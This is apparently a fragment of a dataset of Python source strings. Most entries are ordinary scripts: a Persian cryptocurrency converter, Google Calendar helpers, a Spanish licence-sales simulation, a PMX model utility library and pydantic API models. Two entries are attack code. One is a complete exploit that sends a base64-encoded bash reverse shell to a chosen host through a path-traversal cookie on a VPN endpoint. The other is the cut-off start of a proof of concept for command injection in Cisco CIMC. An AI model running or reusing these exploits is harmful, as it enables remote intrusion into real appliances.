\u0644\u06cc\u0646\u06a9\", \"\u0627\u0633\u062a\u0644\u0627\u0631\", \"\u0628\u06cc\u062a \u06a9\u0648\u06cc\u0646 - \u06a9\u0634\", \"\u06cc\u0648 \u0627\u0633 \u062f\u06cc \u06a9\u0648\u06cc\u0646\", \"\u06a9\u0627\u0632\u0645\u0627\u0633\",\r\n#         \"\u0645\u0648\u0646\u0631\u0648\", \"\u062a\u0631\u0648\u0646\", \"\u06cc\u0648\u062a\u0627\", \"\u0646\u0626\u0648\", \"\u062a\u0632\u0648\u0633\", \"\u0622\u0648\u0647\", \"\u0627\u0644\u06af\u0631\u0648\u0646\u062f\", \r\n#         \"\u0648\u06cc\u0686\u06cc\u0646\", \"\u062a\u0631\u0627\u0644\u0648\u0646\u0627\", \"\u0627\u06a9\u0633\u06cc \u0627\u06cc\u0646\u0641\u06cc\u0646\u06cc\u062a\u06cc\"\r\n\r\nprices = get_crypto_prices(coins)\r\n\r\nconversion_frame = tk.Frame(window)\r\nconversion_frame.pack(pady=10)\r\n\r\nselect_label = tk.Label(conversion_frame, text=\"\u0627\u0631\u0632\u062a\u0627\u0646 \u0631\u0627 \u0627\u0646\u062a\u062e\u0627\u0628 \u06a9\u0646\u06cc\u062f:\", font=(\"Arial\", 12))\r\nselect_label.pack(side=tk.LEFT)\r\n\r\ncoin_var = tk.StringVar(window)\r\ncoin_var.set(coins[0])  # \u0627\u0646\u062a\u062e\u0627\u0628 \u0627\u0648\u0644\u06cc\u0647\r\n\r\ncoin_menu = tk.OptionMenu(conversion_frame, coin_var, *coins)\r\ncoin_menu.pack(side=tk.LEFT)\r\n\r\noutput_text = tk.Text(window, height=10, width=50)\r\noutput_text.pack(pady=10)\r\n\r\nconvert_to_toman_button = tk.Button(conversion_frame, text=\"\u062a\u0628\u062f\u06cc\u0644 \u0627\u0631\u0632 \u062f\u06cc\u062c\u06cc\u062a\u0627\u0644 \u0628\u0647 \u062a\u0648\u0645\u0627\u0646\", command=lambda: ask_amount_and_convert(coin_var.get(), usd_to_toman_rate, prices, output_text, True), font=(\"Arial\", 12))\r\nconvert_to_toman_button.pack(side=tk.LEFT)\r\n\r\nconvert_from_toman_button = tk.Button(conversion_frame, text=\"\u062a\u0628\u062f\u06cc\u0644 \u062a\u0648\u0645\u0627\u0646 \u0628\u0647 \u0627\u0631\u0632 \u062f\u06cc\u062c\u06cc\u062a\u0627\u0644\", command=lambda: ask_amount_and_convert(coin_var.get(), usd_to_toman_rat",
    "from google.oauth2.credentials import Credentials\nfrom google.auth.transport.requests import Request\nfrom googleapiclient.discovery import build\nfrom googleapiclient.errors import HttpError\nfrom google_auth_oauthlib.flow import InstalledAppFlow\nfrom datetime import datetime, timedelta\n\nimport os\n\n# If modifying these scopes, delete the file token.json.\nSCOPES = ['https://www.googleapis.com/auth/calendar']\n\ndef get_credentials():\n    creds = None\n    # The file token.json stores the user's access and refresh tokens, and is\n    # created automatically when the authorization flow completes for the first\n    # time.\n    if os.path.exists('token.json'):\n        creds = Credentials.from_authorized_user_file('token.json', SCOPES)\n    # If there are no (valid) credentials available, let the user log in.\n    if not creds or not creds.valid:\n        if creds and creds.expired and creds.refresh_token:\n            creds.refresh(Request())\n        else:\n            flow = InstalledAppFlow.from_client_secrets_file(\n                'credentials.json', SCOPES)\n            creds = flow.run_local_server(port=0)\n        # Save the credentials for the next run\n        with open('token.json', 'w') as token:\n            token.write(creds.to_json())\n    return creds\n\n\nimport datetime\n\ndef delete_calendar_event(event_id, start_time_str):\n    creds = get_credentials()\n    service = build('calendar', 'v3', credentials=creds)\n    \n    try:\n        # First, try to delete the event by event ID\n        service.events().delete(calendarId='primary', eventId=event_id).execute()\n        return True\n    except HttpError as e:\n        if e.resp.status == 404:\n            print(\"Event ID not found. Trying to find event by start time...\")\n            try:\n                # If event ID not found, try to find the event by start time\n                start_time = datetime.datetime.fromisoformat(start_time_str)\n                end_time = start_time + datetime.timedelta(minutes=1)  # Adjust this as needed\n                start_time_iso = start_time.isoformat()\n                end_time_iso = end_time.isoformat()\n\n                events_result = service.events().list(calendarId='primary', timeMin=start_time_iso, timeMax=end_time_iso).execute()\n                events = events_result.get('items', [])\n                if events:\n                    # Found the event, delete it by its ID\n                    event_id_to_delete = events[0]['id']\n                    service.events().delete(calendarId='primary', eventId=event_id_to_delete).execute()\n                    return True\n                else:\n                    print(\"Event not found by start time.\")\n                    return False\n            except Exception as e:\n                print(f\"Error deleting event by start time: {e}\")\n                return False\n        else:\n            print(f\"Error deleting event by ID: {e}\")\n            return False\n        \ndef parse_event_details(event_details):\n    # Split the event details into datetime and description\n    datetime_str, description = event_details.split(' - ')\n\n    # Parse the datetime string\n    datetime_obj = datetime.fromisoformat(datetime_str)\n\n    # Format the datetime and description in a user-friendly format\n    formatted_date = datetime_obj.strftime('%B %d')\n    formatted_time = datetime_obj.strftime('%I:%M %p')\n    end_time = (datetime_obj + timedelta(hours=1)).strftime('%I:%M %p')\n\n    # Create the user-friendly event details string\n    user_friendly_details = f\"{description}<br><br>{formatted_time} - {end_time}\"\n\n    return user_friendly_details\n\ndef convert_to_iso8601(start_time_str):\n    try:\n        start_time = datetime.strptime(start_time_str, \"%Y-%m-%dT%H:%M:%S%z\")\n        return start_time.isoformat()\n    except ValueError:\n        return None\n\nfrom datetime import datetime\n\ndef parse_datetime_to_day_number(datetime_str):\n    # Parse the datetime string into a datetime object\n    datetime_obj = datetime.strptime(datetime_str.split(' - ')[0], '%Y-%m-%dT%H:%M:%S%z')\n\n    # Get the day number from the datetime object\n    day_number = datetime_obj.day\n\n    return day_number",
    "import numpy as np\r\nimport random\r\nfrom rich.table import Table\r\nfrom rich.console import Console\r\n\r\n#Inserci\u00f3n de Datos y Verificaci\u00f3n\r\nLicenciasCompradas = [100,150,200,250,300]\r\nProbabilidadLicencias = [0.30,0.20,0.30,0.15,0.05]\r\nNAleaGen = 0.0\r\nMediaUtilidad = 0\r\nVarianzaUtilidad = 0\r\nUtilidades = []\r\n\r\nN = int(input(\"Ingrese el n\u00famero de veces que desea realizar la simulaci\u00f3n: \"))\r\nopcion = input(\"Escoja una de las siguientes cantidades como el n\u00famero de licencias que desea comprar: \\na)100\\nb)150\\nc)200\\nd)250\\ne)300\\nIngrese su opci\u00f3n: \").lower()\r\nif opcion == \"a\":\r\n    CantidadEventos = int(1)\r\nelif opcion == \"b\":\r\n    CantidadEventos = int(2)\r\nelif opcion == \"c\":\r\n    CantidadEventos = int(3)\r\nelif opcion == \"d\":\r\n    CantidadEventos = int(4)\r\nelif opcion == \"e\":\r\n    CantidadEventos = int(5)      \r\nelse:\r\n    print(\"Numero Invalido\")\r\n\r\nprint(LicenciasCompradas)\r\n\r\n#Generar Datos para la Tabla\r\n\r\n#AleatorioGenerado\r\ndef NAleatorioGenerado(TotalEventos, NumeroAleatorio):\r\n  global NAleaGen\r\n  valorAnterior = 0\r\n  ProbabilidadMaxima = 0\r\n  numUniforme = NumeroAleatorio\r\n  for j in range (TotalEventos):\r\n      ProbabilidadMaxima = ProbabilidadLicencias[j] + ProbabilidadMaxima\r\n  while numUniforme > ProbabilidadMaxima:\r\n      numUniforme = random.random()\r\n      NAleaGen = numUniforme\r\n  for i in range(TotalEventos):\r\n    if((numUniforme>=valorAnterior)&(numUniforme<=(ProbabilidadLicencias[i] + valorAnterior))):\r\n      return i\r\n    else:\r\n        valorAnterior=ProbabilidadLicencias[i] + valorAnterior\r\n  return TotalEventos-1\r\n\r\n#Tabla a Generar\r\ntable = Table()\r\ntable.add_column(\"N\")\r\ntable.add_column(\"     #aleagen\")\r\ntable.add_column(\"Licencias\\nVendidas\")\r\ntable.add_column(\"Licencias\\nDevueltas\")\r\ntable.add_column(\"Costo\")\r\ntable.add_column(\"Ing X \\n Vta\")\r\ntable.add_column(\"Ing X \\n Dev\")\r\ntable.add_column(\"Utilidad\")\r\n\r\nfor row in range(N):\r\n    NAleaGen = random.random()\r\n    LicenciasVendidas = LicenciasCompradas[NAleatorioGenerado(CantidadEventos, NAleaGen)]\r\n    LicenciasDevueltas = LicenciasCompradas[CantidadEventos-1]-LicenciasVendidas\r\n    Costo = 75*LicenciasCompradas[CantidadEventos-1]\r\n    IngresoVenta = 100*LicenciasVendidas\r\n    IngresoDevoluciones = 25 * LicenciasDevueltas\r\n    Utilidad = (IngresoVenta + IngresoDevoluciones) - Costo\r\n    MediaUtilidad = (MediaUtilidad + Utilidad)\r\n    Utilidades.append(Utilidad)\r\n    table.add_row(f\"{row+1}\", str(NAleaGen), str(LicenciasVendidas), str(LicenciasDevueltas), str(Costo), str(IngresoVenta), str(IngresoDevoluciones), str(Utilidad))\r\nconsole = Console()\r\nconsole.print(table)\r\nprint(\"La media de la Utilidad es: \" , MediaUtilidad/N)\r\nfor k in range(N):\r\n    VarianzaUtilidad = (VarianzaUtilidad + ((Utilidades[k] - (MediaUtilidad/N))**2))\r\nprint(\"La varianza de las Utilidades es igual a: \", VarianzaUtilidad/(N-1))         \r\n",
    "import math\nimport sys\nimport traceback\nfrom os import path, listdir\nfrom typing import Any, Tuple, List, Sequence, Callable, Iterable, TypeVar, Union\n\n_SCRIPT_VERSION = \"Script version:  Nuthouse01 - v1.07.03 - 8/9/2021\"\n# This code is free to use and re-distribute, but I cannot be held responsible for damages that it may or may not cause.\n#####################\n\n# this contains a bunch of functions that are used throughout multiple different scripts\n# it's better to keep them all in one place than copy them for each file\n\n\n########################################################################################################################\n# constants used in many files that I don't wanna keep copying over and over\n########################################################################################################################\n\npmxe_material_csv_header = [\";Material\", \"\u6750\u8cea\u540d\", \"\u6750\u8cea\u540d(\u82f1)\", \"\u62e1\u6563\u8272_R\", \"\u62e1\u6563\u8272_G\", \"\u62e1\u6563\u8272_B\", \"\u62e1\u6563\u8272_A(\u975e\u900f\u904e\u5ea6)\",\n\t\t\t\t\t\t\t\"\u53cd\u5c04\u8272_R\", \"\u53cd\u5c04\u8272_G\", \"\u53cd\u5c04\u8272_B\", \"\u53cd\u5c04\u5f37\u5ea6\", \"\u74b0\u5883\u8272_R\", \"\u74b0\u5883\u8272_G\", \"\u74b0\u5883\u8272_B\", \"\u4e21\u9762\u63cf\u753b(0/1)\",\n\t\t\t\t\t\t\t\"\u5730\u9762\u5f71(0/1)\", \"\u30bb\u30eb\u30d5\u5f71\u30de\u30c3\u30d7(0/1)\", \"\u30bb\u30eb\u30d5\u5f71(0/1)\", \"\u9802\u70b9\u8272(0/1)\", \"\u63cf\u753b(0:Tri/1:Point/2:Line)\",\n\t\t\t\t\t\t\t\"\u30a8\u30c3\u30b8(0/1)\", \"\u30a8\u30c3\u30b8\u30b5\u30a4\u30ba\", \"\u30a8\u30c3\u30b8\u8272_R\", \"\u30a8\u30c3\u30b8\u8272_G\", \"\u30a8\u30c3\u30b8\u8272_B\", \"\u30a8\u30c3\u30b8\u8272_A\",\n\t\t\t\t\t\t\t\"\u30c6\u30af\u30b9\u30c1\u30e3\u30d1\u30b9\", \"\u30b9\u30d5\u30a3\u30a2\u30c6\u30af\u30b9\u30c1\u30e3\u30d1\u30b9\", \"\u30b9\u30d5\u30a3\u30a2\u30e2\u30fc\u30c9(0:\u7121\u52b9/1:\u4e57\u7b97/2:\u52a0\u7b97/3:\u30b5\u30d6\u30c6\u30af\u30b9\u30c1\u30e3)\",\n\t\t\t\t\t\t\t\"Toon\u30c6\u30af\u30b9\u30c1\u30e3\u30d1\u30b9\", \"\u30e1\u30e2\"]\npmxe_material_csv_tag = \"Material\"\npmxe_vertex_csv_header = [\";Vertex\", \"\u9802\u70b9Index\", \"\u4f4d\u7f6e_x\", \"\u4f4d\u7f6e_y\", \"\u4f4d\u7f6e_z\", \"\u6cd5\u7dda_x\", \"\u6cd5\u7dda_y\", \"\u6cd5\u7dda_z\", \"\u30a8\u30c3\u30b8\u500d\u7387\",\n\t\t\t\t\t\t  \"UV_u\", \"UV_v\", \"\u8ffd\u52a0UV1_x\", \"\u8ffd\u52a0UV1_y\", \"\u8ffd\u52a0UV1_z\", \"\u8ffd\u52a0UV1_w\", \"\u8ffd\u52a0UV2_x\", \"\u8ffd\u52a0UV2_y\",\n\t\t\t\t\t\t  \"\u8ffd\u52a0UV2_z\", \"\u8ffd\u52a0UV2_w\", \"\u8ffd\u52a0UV3_x\", \"\u8ffd\u52a0UV3_y\", \"\u8ffd\u52a0UV3_z\", \"\u8ffd\u52a0UV3_w\", \"\u8ffd\u52a0UV4_x\",\n\t\t\t\t\t\t  \"\u8ffd\u52a0UV4_y\", \"\u8ffd\u52a0UV4_z\", \"\u8ffd\u52a0UV4_w\", \"\u30a6\u30a7\u30a4\u30c8\u5909\u5f62\u30bf\u30a4\u30d7(0:BDEF1/1:BDEF2/2:BDEF4/3:SDEF/4:QDEF)\",\n\t\t\t\t\t\t  \"\u30a6\u30a7\u30a4\u30c81_\u30dc\u30fc\u30f3\u540d\", \"\u30a6\u30a7\u30a4\u30c81_\u30a6\u30a7\u30a4\u30c8\u5024\", \"\u30a6\u30a7\u30a4\u30c82_\u30dc\u30fc\u30f3\u540d\", \"\u30a6\u30a7\u30a4\u30c82_\u30a6\u30a7\u30a4\u30c8\u5024\",\n\t\t\t\t\t\t  \"\u30a6\u30a7\u30a4\u30c83_\u30dc\u30fc\u30f3\u540d\", \"\u30a6\u30a7\u30a4\u30c83_\u30a6\u30a7\u30a4\u30c8\u5024\", \"\u30a6\u30a7\u30a4\u30c84_\u30dc\u30fc\u30f3\u540d\", \"\u30a6\u30a7\u30a4\u30c84_\u30a6\u30a7\u30a4\u30c8\u5024\", \"C_x\",\n\t\t\t\t\t\t  \"C_y\", \"C_z\", \"R0_x\", \"R0_y\", \"R0_z\", \"R1_x\", \"R1_y\", \"R1_z\"]\npmxe_vertex_csv_tag = \"Vertex\"\npmxe_bone_csv_header = [\";Bone\", \"\u30dc\u30fc\u30f3\u540d\", \"\u30dc\u30fc\u30f3\u540d(\u82f1)\", \"\u5909\u5f62\u968e\u5c64\", \"\u7269\u7406\u5f8c(0/1)\", \"\u4f4d\u7f6e_x\", \"\u4f4d\u7f6e_y\", \"\u4f4d\u7f6e_z\",\n\t\t\t\t\t\t\"\u56de\u8ee2(0/1)\", \"\u79fb\u52d5(0/1)\", \"IK(0/1)\", \"\u8868\u793a(0/1)\", \"\u64cd\u4f5c(0/1)\", \"\u89aa\u30dc\u30fc\u30f3\u540d\", \"\u8868\u793a\u5148(0:\u30aa\u30d5\u30bb\u30c3\u30c8/1:\u30dc\u30fc\u30f3)\",\n\t\t\t\t\t\t\"\u8868\u793a\u5148\u30dc\u30fc\u30f3\u540d\", \"\u30aa\u30d5\u30bb\u30c3\u30c8_x\", \"\u30aa\u30d5\u30bb\u30c3\u30c8_y\", \"\u30aa\u30d5\u30bb\u30c3\u30c8_z\", \"\u30ed\u30fc\u30ab\u30eb\u4ed8\u4e0e(0/1)\", \"\u56de\u8ee2\u4ed8\u4e0e(0/1)\",\n\t\t\t\t\t\t\"\u79fb\u52d5\u4ed8\u4e0e(0/1)\", \"\u4ed8\u4e0e\u7387\", \"\u4ed8\u4e0e\u89aa\u540d\", \"\u8ef8\u5236\u9650(0/1)\", \"\u5236\u9650\u8ef8_x\", \"\u5236\u9650\u8ef8_y\", \"\u5236\u9650\u8ef8_z\", \"\u30ed\u30fc\u30ab\u30eb\u8ef8(0/1)\",\n\t\t\t\t\t\t\"\u30ed\u30fc\u30ab\u30ebX\u8ef8_x\", \"\u30ed\u30fc\u30ab\u30ebX\u8ef8_y\", \"\u30ed\u30fc\u30ab\u30ebX\u8ef8_z\", \"\u30ed\u30fc\u30ab\u30ebZ\u8ef8_x\", \"\u30ed\u30fc\u30ab\u30ebZ\u8ef8_y\", \"\u30ed\u30fc\u30ab\u30ebZ\u8ef8_z\",\n\t\t\t\t\t\t\"\u5916\u90e8\u89aa(0/1)\", \"\u5916\u90e8\u89aaKey\", \"IKTarget\u540d\", \"IKLoop\", \"IK\u5358\u4f4d\u89d2[deg]\"]\npmxe_bone_csv_tag = \"Bone\"\npmxe_morph_csv_header = [\";Morph\", \"\u30e2\u30fc\u30d5\u540d\", \"\u30e2\u30fc\u30d5\u540d(\u82f1)\", \"\u30d1\u30cd\u30eb(0:\u7121\u52b9/1:\u7709(\u5de6\u4e0b)/2:\u76ee(\u5de6\u4e0a)/3:\u53e3(\u53f3\u4e0a)/4:\u305d\u306e\u4ed6(\u53f3\u4e0b))\",\n\t\t\t\t\t\t \"\u30e2\u30fc\u30d5\u7a2e\u985e(0:\u30b0\u30eb\u30fc\u30d7\u30e2\u30fc\u30d5/1:\u9802\u70b9\u30e2\u30fc\u30d5/2:\u30dc\u30fc\u30f3\u30e2\u30fc\u30d5/3:UV(Tex)\u30e2\u30fc\u30d5/4:\u8ffd\u52a0UV1\u30e2\u30fc\u30d5/5:\u8ffd\u52a0UV2\u30e2\u30fc\u30d5/6:\u8ffd\u52a0UV3\u30e2\u30fc\u30d5/7:\u8ffd\u52a0UV4\u30e2\u30fc\u30d5/8:\u6750\u8cea\u30e2\u30fc\u30d5/9:\u30d5\u30ea\u30c3\u30d7\u30e2\u30fc\u30d5/10:\u30a4\u30f3\u30d1\u30eb\u30b9\u30e2\u30fc\u30d5)\"]\npmxe_morph_csv_tag = \"Morph\"\npmxe_morphvertex_csv_tag = \"VertexMorph\"\npmxe_morphmaterial_csv_tag = \"MaterialMorph\"\npmxe_morphuv_csv_tag = \"UVMorph\"\npmxe_rigidbody_csv_header = [\";Body\", \"\u525b\u4f53\u540d\", \"\u525b\u4f53\u540d(\u82f1)\", \"\u95a2\u9023\u30dc\u30fc\u30f3\u540d\", \"\u525b\u4f53\u30bf\u30a4\u30d7(0:Bone/1:\u7269\u7406\u6f14\u7b97/2:\u7269\u7406\u6f14\u7b97+\u30dc\u30fc\u30f3\u8ffd\u5f93)\",\n\t\t\t\t\t\t\t \"\u30b0\u30eb\u30fc\u30d7(0~15)\", \"\u975e\u885d\u7a81\u30b0\u30eb\u30fc\u30d7\u6587\u5b57\u5217(ex:1 2 3 4)\", \"\u5f62\u72b6(0:\u7403/1:\u7bb1/2:\u30ab\u30d7\u30bb\u30eb)\", \"\u30b5\u30a4\u30ba_x\",\n\t\t\t\t\t\t\t \"\u30b5\u30a4\u30ba_y\", \"\u30b5\u30a4\u30ba_z\", \"\u4f4d\u7f6e_x\", \"\u4f4d\u7f6e_y\", \"\u4f4d\u7f6e_z\", \"\u56de\u8ee2_x[deg]\", \"\u56de\u8ee2_y[deg]\", \"\u56de\u8ee2_z[deg]\",\n\t\t\t\t\t\t\t \"\u8cea\u91cf\", \"\u79fb\u52d5\u6e1b\u8870\", \"\u56de\u8ee2\u6e1b\u8870\", \"\u53cd\u767a\u529b\", \"\u6469\u64e6\u529b\"]\npmxe_rigidbody_csv_tag = \"Body\"\npmxe_face_csv_header = [\";Face\", \"\u89aa\u6750\u8cea\u540d\", \"\u9762Index\", \"\u9802\u70b9Index1\", \"\u9802\u70b9Index2\", \"\u9802\u70b9Index3\"]\npmxe_face_csv_tag = \"Face\"\n\ninterpolation_default_linear = [20, 20, 107, 107]\n\n########################################################################################################################\n# misc functions and user-input functions\n########################################################################################################################\n\ndef basic_print(*args, is_progress=False) -> None:\n\t\"\"\"\n\tCONSOLE FUNCTION: emulate builtin print() function and display text in console.\n\t\n\t:param args: any number of string-able objects, will be joined with spaces.\n\t:param is_progress: default false. if true, move the cursor to the beginning of THIS line after printing, so NEXT\n\tprint contents will overwrite this one.\n\t\"\"\"\n\tthe_string = ' '.join([str(x) for x in args])\n\t# replace the print() function with this so i can replace this with the text redirector\n\tif is_progress:\n\t\t# leave the cursor at the beginning of the line so the next print statement overwrites this\n\t\tprint(the_string, end='\\r', flush=True)\n\t\t# print('\\r' + p, end='', flush=True)  # leave cursor at the end of the line\n\t\t# print('\\r', end='', flush=False)  # force NEXT print statement to begin by resetting to the start of the line\n\telse:\n\t\t# otherwise use the normal print\n\t\tprint(the_string)\n\n# global variable holding a function pointer that i can overwrite with a different function pointer when in GUI mode\nMY_PRINT_FUNC = basic_print\n\ndef pause_and_quit(message=None) -> None:\n\t\"\"\"\n\tCONSOLE FUNCTION: use input() to suspend until user presses ENTER, then die.\n\tDO NOT USE THIS FUNCTION IN ANY SCRIPTS THAT WILL BE EXECUTED BY THE GUI.\n\t\n\t:param message: optional string to print before dying\n\t\"\"\"\n\t# wait for user input before exiti",
    "import subprocess\nimport base64\n\ndef generate_reverse_shell(lhost, lport):\n    reverse_shell_command = f\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"\n    encoded_reverse_shell = base64.b64encode(reverse_shell_command.encode()).decode()\n    return encoded_reverse_shell\n\ndef generate_curl_command(IP, encoded_reverse_shell):\n    curl_command = (\n        f\"curl -s -X POST 'https://{IP}/ssl-vpn/hipreport.esp' -k \"\n        f\"-H 'Cookie: SESSID=/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${{IFS}}{encoded_reverse_shell}|base64${{IFS}}-d|bash`'\"\n    )\n\n    return curl_command\n\nIP = input(\"Enter the vulnerable target IP/Host: \")\nlhost = input(\"Enter the IP/Host for reverse shell: \")\nlport = input(\"Enter the port for reverse shell: \")\n\nencoded_reverse_shell = generate_reverse_shell(lhost, lport)\n\ncurl_command = generate_curl_command(IP, encoded_reverse_shell)\n\ntry:\n    subprocess.run(curl_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    print(\"Reverse shell successfully launched. Please wait.\")\nexcept subprocess.CalledProcessError:\n    print(\"Error occurred while launching reverse shell.\")\n",
    "# -*- coding:utf-8 -*-\n\nfrom datetime import datetime\nfrom typing import Any, List, Optional, Union\n\nfrom pydantic import BaseModel, Field\n\nclass CustomModeGenerateParam(BaseModel):\n    \"\"\"Generate with Custom Mode\"\"\"\n\n    prompt: str = Field(..., description=\"lyrics\")\n    mv: str = Field(\n        ...,\n        description=\"model version, default: chirp-v3-0\",\n        examples=[\"chirp-v3-0\"],\n    )\n    title: str = Field(..., description=\"song title\")\n    tags: str = Field(..., description=\"style of music\")\n    continue_at: Optional[str] = Field(\n        default=None,\n        description=\"continue a new clip from a previous song, format mm:ss\",\n        examples=[\"01:23\"],\n    )\n    continue_clip_id: Optional[str] = None\n\n\nclass DescriptionModeGenerateParam(BaseModel):\n    \"\"\"Generate with Song Description\"\"\"\n\n    gpt_description_prompt: str\n    make_instrumental: bool = False\n    mv: str = Field(\n        ...,\n        description=\"model version, default: chirp-v3-0\",\n        examples=[\"chirp-v3-0\"],\n    )\n    prompt: str = Field(\n        default=\"\",\n        description=\"Placeholder, keep it as an empty string, do not modify it\",\n    )\n\nclass LyricsGenerateParam(BaseModel):\n    \"\"\"Generate with Song Lyrics\"\"\"\n    prompt: str = Field(\n        default=\"Someone who is passionate about work and life.\",\n    )",
    "#!/usr/bin/python3\r\n\"\"\"\r\nExploit for CVE-2024-20356: Command Injection in Cisco CIMC\r\nAaron Thacker @ LRQA Nettitude 2024\r\n\r\nFull details can be found at https://labs.nettitude.com/blog/cve-2024-20356-jailbreaking-a-cisco-appliance-to-run-doom\r\n\r\nThis proof-of-concept is for demonstration purposes and should not be used for illegal activities. LRQA Nettitude are not responsible for any damage caused by the use or misuse of this code.\r\n\r\nUsage: CVE-2024-20356.py [-h] -t HOST -u USERNAME -p PASSWORD [-a ACTION] [-c CMD] [-v]\r\noptions:\r\n  -h, --help            show this help message and exit\r\n  -t HOST, --host HOST  target hostname or IP address (format 10.0.0.1 or 10.0.0.2:1337)\r\n  -u USERNAME, --username USERNAME\r\n                        Username (default: admin)\r\n  -p PASSWORD, --password PASSWORD\r\n                        Password (default: cisco)\r\n  -a ACTION, --action ACTION\r\n                        Action: test, cmd, shell, dance (default: test)\r\n  -c CMD, --cmd CMD     OS command to run (Default: NONE)\r\n  -v, --verbose         Displays more information about cimc\r\n\r\n\"\"\"\r\n\r\nimport Crypto.Random\r\nimport Crypto.Cipher\r\nimport base64\r\nimport hashlib\r\nimport hmac\r\nimport requests\r\nimport urllib3\r\nfrom Crypto.Cipher import AES\r\nimport urllib.parse\r\nimport re\r\nimport xml.etree.ElementTree as ET\r\nimport argparse\r\nimport random\r\nimport time\r\n\r\n# Set to \"127.0.0.1:8080\" to use a proxy\r\nproxy = None\r\n\r\n# derrived from /lib/thirdparty/thirdparty.js\r\ndef hashFnv32(a, b):\r\n\tb = bytes(b, encoding='ascii')\r\n\te = 40389\r\n\th = a[0:32]\r\n\tf = len(h)//4\r\n\tfor i in range (0, f):\r\n\t\te = e ^ ord(a[i])\r\n\t\te = e + (e << 1)\r\n\treturn hmac.new(bytes(str(e), encoding='ascii'), b, hashlib.sha512).hexdigest()\r\n\r\n# derrived from /lib/thirdparty/thirdparty.js\r\ndef keyFnv32(a):\r\n\te = 40389\r\n\th = a[0:32]\r\n\tf = len(h)//4\r\n\tfor i in range (0, f):\r\n\t\te = e ^ ord(a[i])\r\n\t\te = e + (e << 1)\r\n\te = str(e)\r\n\treturn e\r\n\r\n# derrived from CryptoJS\r\ndef derive_key_and_iv(secret):\r\n\tsalt = Crypto.Random.new().read(8)\r\n\tsecret = bytes(secret, encoding='ascii')\r\n\tkeylen = 32\r\n\tivlen = 16\r\n\tsecret += salt\r\n\tk = hashlib.md5(secret).digest()\r\n\tw = k \r\n\twhile len(w) < (keylen + ivlen):\r\n\t\tk = hashlib.md5(k + secret).digest()\r\n\t\tw += k\r\n\treturn  w[:keylen], w[keylen:keylen+ivlen], salt\r\n\r\ndef pad(data):\r\n\tBLOCK_SIZE = 16\r\n\treturn data+(BLOCK_SIZE-len(data)%BLOCK_SIZE)*chr(BLOCK_SIZE-len(data)%BLOCK_SIZE)\r\n\r\n# derrived from CryptoJS\r\ndef encrypt(username, password):\r\n\tsecret = str(keyFnv32(username))\r\n\tmsg = password\r\n\tkey, iv, salt = derive_key_and_iv(secret)\r\n\taes = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_CBC, iv)\r\n\tpadded_msg = bytes(pad(msg), encoding='ascii')\r\n\tencrypted_msg = aes.encrypt(padded_msg)\r\n\treturn base64.b64encode(b\"Salted__\" + salt + encrypted_msg)\r\n\r\n\r\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\r\n\r\ndef headers():\r\n\tprint(\"\"\"\r\n   _____ _____  _____  _____                    \r\n  / ____|_   _|/ ____|/ ____|                   \r\n | |      | | | (___ | |     _____      ___ __  \r\n | |      | |  \\___ \\| |    / _ \\ \\ /\\ / / '_ \\ \r\n | |____ _| |_ ____) | |___| (_) \\ V  V /| | | |\r\n  \\_____|_____|_____/ \\_____\\___/ \\_/\\_/ |_| |_|\r\n                                                                              \r\n\t\t\"\"\")\r\n\tprint(\"~ Because every vulnerability needs a cool tool\")\r\n\tprint(\"~ AThacker @ LRQA Nettitude | v1.0\\n\")\r\n\tprint(\"This proof-of-concept is for demonstration purposes and should not be used for illegal activities.\\nLRQA Nettitude are not responsible for any damage caused by the use or misuse of this code.\")\r\n\r\n\r\ndef login(target, username, password):\r\n\tenc_password = encrypt(username, password)\r\n\r\n\treq = requests.post(f\"https://{target}/data/login\",\r\n\t\theaders={'Referer':f'https://{target}/login.html','Accept-Encoding': 'identity'},\r\n\t\tproxies={\"https\":proxy,\"http\":proxy},\r\n\t\tverify=False,\r\n\t\tdata={\"user\":username,\"password\":enc_password}\r\n\t)\r\n\r\n\troot = ET.fromstring(req.content)\r\n\tif root.find('authResult').text == '0':\r\n\t\tsidValue = root.find('sidValue').text\r\n\t\tadminUser = True if root.find('adminUser').text == '1' else False\r\n\t\tcookieValue = re.search('sessionCookie=([a-z0-9]{32});', req.headers['Set-Cookie']).group(1)\r\n\t\tprint(f\"sidValue: {sidValue[0:8]}XXXXXXXXXXXXXXXXXXXXXXXX\")\r\n\t\tprint(f\"cookieValue: {cookieValue[0:8]}XXXXXXXXXXXXXXXXXXXXXXXX\")\r\n\t\tprint(f\"Admin user: {adminUser}\")\r\n\t\treturn (True, cookieValue, sidValue, adminUser)\r\n\telse:\r\n\t\treturn (False, None, None, None)\r\n\r\ndef logout(target, sidValue):\r\n\tprint(f\"Logging out: {sidValue[0:8]}XXXXXXXXXXXXXXXXXXXXXXXX\")\r\n\treq = requests.post(f\"https://{target}/data/logout\",\r\n\t\theaders={'Referer':f'https://{target}/index.html','Accept-Encoding': 'identity'},\r\n\t\tproxies={\"https\":proxy,\"http\":proxy},\r\n\t\tverify=False,\r\n\t\tdata={\"sessionID\":sidValue}\r\n\t)\r\n\treturn None\r\n\r\ndef query(target, cookieValue, sidValue, input_cmd):\r\n\tres = query_raw(target, cookieValue, sidValue, input_cmd)\r\n\treturn ET.fromstring(res.content)\r\n\r\ndef query_raw(target, cookieValue, ",
